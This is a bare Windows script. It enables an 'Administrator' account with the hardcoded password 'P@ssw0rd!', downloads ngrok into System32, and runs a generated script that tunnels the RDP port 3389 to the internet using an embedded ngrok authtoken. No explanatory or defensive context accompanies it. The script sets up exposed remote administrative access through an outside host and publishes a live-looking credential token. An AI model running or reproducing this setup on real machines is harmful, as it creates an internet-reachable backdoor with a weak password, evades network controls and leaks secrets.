cmd /c net user Administrator /add
cmd /c net localgroup administrators Administrator /add
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
Get-LocalUser -Name "Administrator" | Enable-LocalUser 
Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
tar xf ngrok.zip
Copy ngrok.exe C:\Windows\System32
cmd /c echo ./ngrok.exe authtoken "1uTirkBjQTOtm7pwu89SXwWq8sw_3Q4ofsdT5rhULVKhB5gJU" >a.ps1
cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
cmd /c echo ping -n 99999 10.10.10.10 >>a.ps1
.\a.ps1
